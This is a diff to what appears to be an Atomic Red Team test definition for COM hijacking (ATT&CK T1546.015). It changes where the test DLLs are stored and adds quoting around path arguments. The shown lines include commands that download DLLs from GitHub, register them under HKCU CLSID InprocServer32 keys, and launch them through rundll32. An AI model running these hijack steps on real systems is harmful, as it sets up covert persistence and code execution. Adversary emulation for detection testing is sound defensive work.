@@ -17,7 +17,7 @@ atomic_tests:
     dllpath:
       description: Path to the DLL.
       type: string
-      default: $env:TEMP\AtomicTest.dll
+      default: PathToAtomicsFolder\..\ExternalPayloads\AtomicTest.dll
     clsid:
       description: Class ID to hijack.
       type: string
@@ -29,12 +29,14 @@ atomic_tests:
   dependency_executor_name: powershell
   dependencies:
   - description: DLL For testing
-    prereq_command: 'if (Test-Path #{dllpath}) {exit 0} else {exit 1}'
-    get_prereq_command: Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.015/bin/AtomicTest.dll" -OutFile "#{dllpath}"
+    prereq_command: 'if (Test-Path "#{dllpath}") {exit 0} else {exit 1}'
+    get_prereq_command: |
+      New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.015/bin/AtomicTest.dll" -OutFile "#{dllpath}"
   executor:
     command: |-
       New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}' -Value '#{clsid_description}'
-      New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}\InprocServer32' -Value #{dllpath}
+      New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}\InprocServer32' -Value "#{dllpath}"
       New-ItemProperty -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}\InprocServer32' -Name 'ThreadingModel' -Value '#{clsid_threading}' -PropertyType "String"
       Start-Process -FilePath "C:\Windows\System32\RUNDLL32.EXE" -ArgumentList '-sta #{clsid}'
     cleanup_command: |-
@@ -72,7 +74,7 @@ atomic_tests:
     dll_path:
       description: Path to the DLL.
       type: string
-      default: $env:temp\T1546.015_calc.dll
+      default: PathToAtomicsFolder\..\ExternalPayloads\T1546.015_calc.dll
     clsid:
       description: Class ID to hijack.
       type: string
@@ -84,12 +86,14 @@ atomic_tests:
   dependency_executor_name: powershell
   dependencies:
   - description: DLL For testing
-    prereq_command: 'if (Test-Path #{dll_path}) {exit 0} else {exit 1}'
-    get_prereq_command: Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.015/bin/T1546.015_calc.dll" -OutFile "#{dll_path}"
+    prereq_command: 'if (Test-Path "#{dll_path}") {exit 0} else {exit 1}'
+    get_prereq_command: |
+      New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.015/bin/T1546.015_calc.dll" -OutFile "#{dll_path}"
   executor:
     command: |-
       New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}' -Value '#{clsid_description}'
-      New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}\InprocServer32' -Value #{dll_path}
+      New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}\InprocServer32' -Value "#{dll_path}"
       New-ItemProperty -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}\InprocServer32' -Name 'ThreadingModel' -Value '#{clsid_threading}' -PropertyType "String"
       Start-Process -FilePath "C:\Windows\System32\RUNDLL32.EXE" -ArgumentList '-localserver #{clsid}'
     cleanup_command: |-
